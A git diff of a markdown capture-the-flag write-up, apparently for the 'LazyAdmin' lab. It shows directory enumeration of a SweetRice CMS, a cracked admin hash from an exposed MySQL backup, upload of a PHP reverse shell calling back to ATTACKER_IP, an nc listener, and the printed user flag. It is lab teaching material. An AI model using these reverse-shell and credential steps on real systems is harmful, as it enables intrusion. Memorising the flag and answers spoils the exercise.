@@ -41,6 +41,14 @@ nmap -Pn -p- -sC -sV MACHINE_IP -vvv -oA nmap_full
 
 <img width="1434" height="882" alt="image" src="https://github.com/user-attachments/assets/63f19e39-588c-4df7-92cd-30a258b6b718" />
 
+We see that ports 22 (SSH) and port 80 (HTTP) are open  
+**What does it mean to have SSH enabled?**  
+We need to find the username and password. For this, we need to check the websites.  
+ssh username@IP
+
+
+**STEP 2:WEBB PAGE SEARCH**  
+STEP3: dirb http://10.10.230.160 or you can use gobuster .I started the dirb scan because it takes a lot of time.
 
 ### What are we looking for?
 
@@ -50,6 +58,7 @@ nmap -Pn -p- -sC -sV MACHINE_IP -vvv -oA nmap_full
 * Web services
 * Potential attack surface
 
+Let's start with **dirb or Gobuster.**
 ---
 
 ## 3. Web Enumeration
@@ -62,99 +71,71 @@ If a web service is discovered, begin enumerating hidden directories and files.
 gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
+<img width="779" height="428" alt="image" src="https://github.com/user-attachments/assets/a83da68c-1f72-49eb-8a92-e302b3a1f3c4" />
+
+
 ### Dirb
 
 ```bash
 dirb http://MACHINE_IP/
 ```
 
+<img width="511" height="823" alt="image" src="https://github.com/user-attachments/assets/8eaa35d3-67b9-4805-8734-bdd2da67428e" />
+
 ### Goal
+Discover hidden directories and files.
+Identify the SweetRice CMS directory structure.
+Map interesting paths for further enumeration.
+Discovered Directories
+/content/
+/content/as/
+/content/attachment/
+/content/images/
+/content/inc/
+/content/js/
 
-Identify interesting resources such as:
-
-```text
-/backup
-/admin
-/login
-/uploads
-/config
-```
-
-> Pay close attention to directories containing backups, configuration files, login panels, or other sensitive information.
-
+Directory enumeration reveals the SweetRice CMS structure and several paths worth further investigation.
 ---
 
-## 4. Directory Analysis
+## 4. VISETED CONTENT
 
-Review the directories discovered during enumeration.
+<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/ae446187-3b98-42a0-96ab-6ecb8a2dae23" />
 
-Possible findings:
+<img width="1402" height="1122" alt="image" src="https://github.com/user-attachments/assets/2fb305fe-0f1e-41f9-9c97-15af6d8c58df" />
 
-```text
-Web Enumeration
-      │
-      ├── Backup File
-      │
-      └── Login Panel
-```
+This message says:Website Under Construction: The website is still in the development phase.  
+So the guy is working slowly, LAZYADMIN!!
 
-A publicly accessible backup file may expose sensitive system information.
+Unlike the other directories, we can see /inc and /as directories. Let's proceed with our operations by examining these 2 directories.
 
----
+**==> DIRECTORY: http://10.10.139.224/content/as/**
 
-## 5. Backup File — Critical Finding
+<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/80b403d4-4ac2-40ac-9046-f20abe0ec559" />
 
-A backup file may contain:
+In this directory, we encounter a login screen. Let's quickly take a look at the /inc directory to gather more information about this screen.
 
-* Database data
-* Usernames
-* Password hashes
-* Credentials
-* Configuration details
+==> DIRECTORY: http://10.10.139.224/content/inc/
 
-If a direct copy of production data is accessible through the web server, this may represent a **Sensitive Data Exposure** issue.
+<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/6687ba65-0b6a-4535-b262-d4e2efcb73c7" />
 
-### Possible Attack Path
+Here's a revised version of the sentence:
 
-```text
-Backup File
-    ↓
-Sensitive Data
-    ↓
-Credentials
-    ↓
-Login Access
-```
+In this directory, there is also a `mysql_backup` folder, which contains backups of all the admin's databases. We found an SQL file here and opened it.
 
----
+Let's try to find the username and password in this database.
 
-## 6. Credential Discovery
+<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/165e6021-0d58-4342-9019-282a8b38fd5e" />
 
-Inspect the discovered database backup.
+click it
 
-```bash
-cat mysql-backup.sql
-```
+<img width="1920" height="931" alt="image" src="https://github.com/user-attachments/assets/0bd54fc2-607a-4f3c-95a2-897217860e8b" />
 
-Look for credentials or password hashes.
-
-```text
-Username: __________________
-
-Password / Hash: __________________
-```
-
-Save any discovered credentials for further investigation.
-
----
-
-## 7. Hash Cracking
+**Credential Discovery / Hash Cracking**
 
 If the password is stored as a hash, first identify the hash type and then attempt to recover the plaintext password using an authorized password-recovery tool.
 
 Useful tools include:
 
-* CyberChef
 * CrackStation
 * Hashes.com
 * John the Ripper
@@ -171,199 +152,125 @@ Display recovered credentials:
 
 ```bash
 john --show hash.txt
-```
 
-### Result
+From the backup file, we identified the following credentials:
 
-```text
-Username: __________________
+Username: manager
+Password Hash: 42f749ade7f9e195bf475f37a44cafcb
 
-Password: __________________
-```
+The password is stored as a hash, so our next step is to identify and attempt to crack it using CrackStation.
 
----
+After successfully recovering the password, we can use the discovered credentials to attempt to log in to the SweetRice CMS.
 
-## 8. Initial Access
+<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/6f0fea7d-2eed-430d-ab84-29a20f08f6ae" />
 
-Use the discovered credentials against the identified login panel.
+username: manager
 
-```text
-Username: __________________
-Password: __________________
-```
+password:Password123
 
-> Prioritize login panels and other interesting directories revealed during Gobuster or Dirb enumeration.
+lets try enter the webbpage: http://10.10.180.128/content/as/
 
-Successful authentication provides access to additional application functionality.
+<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/e3472e92-1d46-4291-a16e-5d5d903d8ef8" />
 
----
+<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/f5a9c228-e1bb-442c-bf38-29662a1575be" />
 
-## 9. Exploitation — File Upload / RCE
+we changed webbsite status 'running'
 
-After gaining authenticated access, inspect the application for functionality that could lead to **Remote Code Execution (RCE)**.
+<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/c65dfe47-89a4-4dad-bd3c-fb03321f32ad" />
 
-One possible attack path is an insecure file upload.
 
-### File Upload Testing
+After successfully logging in, we start poking around the panel :) Let's try to get a reverse shell and get a PHP shell code from Github to add it here.
 
-Investigate whether the application accepts executable file extensions such as:
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 
-```text
-.php
-.phtml
-.php5
-```
+To access MySQL databases, we need valid credentials and a connection to the MySQL server. However, if we want to execute commands on the server, we can use a reverse shell.
 
-For example, if `.php` files are blocked but `.phtml` files are accepted, the upload filter may be insufficient.
+In the reverse shell, we need to change the **'CHANGE THIS'** sections.
 
-### ExploitDB / SearchSploit
+- **LHOST (Local Host):** This is the attacker's machine IP address. It's where the exploit sends information or establishes a connection after successfully compromising a target.
+    
+- **RHOST (Remote Host):** This is the target's machine IP address. It's the system being attacked by the exploit.
 
-Search locally for known exploits related to the discovered application or version.
+<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/200f2464-25f2-4bcf-96d4-4386e3c2e2b9" />
 
-```bash
-searchsploit <application-name>
-```
+Let's copy the code here and modify the necessary parts (IP and port). we use local ip and i use port 9001
 
-Example:
+<img width="1918" height="802" alt="image" src="https://github.com/user-attachments/assets/0b6cf3fc-05dd-4aac-a12c-c1ce49496daf" />
 
-```bash
-searchsploit <application-name> <version>
-```
+I will check with content/inc/ads directory
+http://10.10.180.128/content/inc/ads/
 
-Review an interesting exploit:
+<img width="957" height="377" alt="image" src="https://github.com/user-attachments/assets/089fb684-99fa-4407-bd2e-f5d59edbeafc" />
+
+
+### Create the Reverse Shell File
+
+Create a file for the reverse shell payload:
 
 ```bash
-searchsploit -x <exploit-path>
+reverse-shell
 ```
 
----
-
-## 10. Reverse Shell
-
-Start a Netcat listener on the attacking machine.
+Next, start a Netcat listener on the Kali machine to wait for the incoming connection:
 
 ```bash
-nc -lvnp <PORT>
+nc -lvnp 9001
 ```
+<img width="1672" height="941" alt="image" src="https://github.com/user-attachments/assets/fce3d625-67e5-4fb9-bb64-ac3a4e97dd37" />
 
-### Netcat (`nc`)
+listening is starting and go to content/inc/ads click **file name**reverse-shell
 
-Netcat is a networking utility that can:
+we created the shell as a successfully
 
-* Send and receive network data
-* Listen for incoming connections
-* Receive reverse shell connections
+<img width="1920" height="931" alt="image" src="https://github.com/user-attachments/assets/d16146dd-745a-4728-8934-5fa0ecdc4dbd" />
 
-Example:
 
-```bash
-nc -lvnp 1234
-```
+```markdown
+### Initial Shell Access
 
-### PHP Reverse Shell
+Start a Netcat listener:
 
-A commonly used lab resource is:
+nc -lvnp 9001
 
-`pentestmonkey/php-reverse-shell`
+Once the reverse shell connects, verify the current user:
 
-Modify the callback IP address and port:
-
-```php
-$ip = 'ATTACKER_IP';   // CHANGE THIS
-$port = 1234;          // CHANGE THIS
-```
-
-> `ATTACKER_IP` should be the IP address reachable from the target machine.
-
-Upload the payload through the vulnerable application and trigger it.
-
-### Expected Attack Flow
-
-```text
-File Upload
-    ↓
-Payload Uploaded
-    ↓
-Payload Triggered
-    ↓
-Reverse Connection
-    ↓
-Remote Shell
-```
-
----
-
-## 11. Stabilize the Shell
-
-A basic reverse shell may have limited terminal functionality.
-
-Check whether Python is available:
-
-```bash
-which python
-```
-
-or:
-
-```bash
-which python3
-```
-
-Using the **GTFOBins → Python → Shell** reference, you may see commands such as:
-
-```bash
-python -c 'import pty; pty.spawn("/bin/bash")'
-```
-
-or:
-
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
-
-This provides a more interactive shell.
-
-Verify your current context:
-
-```bash
 whoami
+# www-data
+
+Navigate to the user's home directory:
+
+cd /home/itguy
+ls
+
+Several interesting files are discovered, including:
+
+- backup.pl
+- mysql_login.txt
+- user.txt
+
+Read the user flag:
+
+cat user.txt
+
+# THM{63e5bce9271952aad1113b6f1ac28a07}
 ```
 
-```bash
-id
-```
+**Result:** We successfully gained a shell as `www-data`, enumerated the `itguy` home directory, and obtained the `user.txt` flag.
+
 
 ---
 
-## 12. User Flag
 
-Search for the user flag.
 
-```bash
-find / -type f -name "user.txt" 2>/dev/null
-```
 
-Alternative:
 
-```bash
-find / -name "user.txt" 2>/dev/null
-```
 
-Read the discovered flag:
 
-```bash
-cat /path/to/user.txt
-```
 
-### Result
 
-```text
-User Flag: __________________
-```
 
-> Finding `user.txt` confirms successful user-level access.
 
----
+
 
 ## 13. Privilege Escalation Enumeration
 
